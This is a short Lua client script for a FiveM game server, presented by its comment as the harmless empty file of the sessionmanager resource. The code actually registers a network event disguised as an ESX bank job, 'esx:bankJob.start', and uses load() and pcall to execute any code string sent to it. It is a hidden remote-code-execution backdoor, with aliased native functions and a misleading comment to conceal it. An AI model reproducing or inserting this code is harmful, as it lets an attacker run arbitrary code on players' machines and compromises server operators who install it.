local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
--This empty file causes the scheduler.lua to load clientside
--scheduler.lua when loaded inside the sessionmanager resource currently manages remote callbacks.
--Without this, callbacks will only work server->client and not client->server.

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)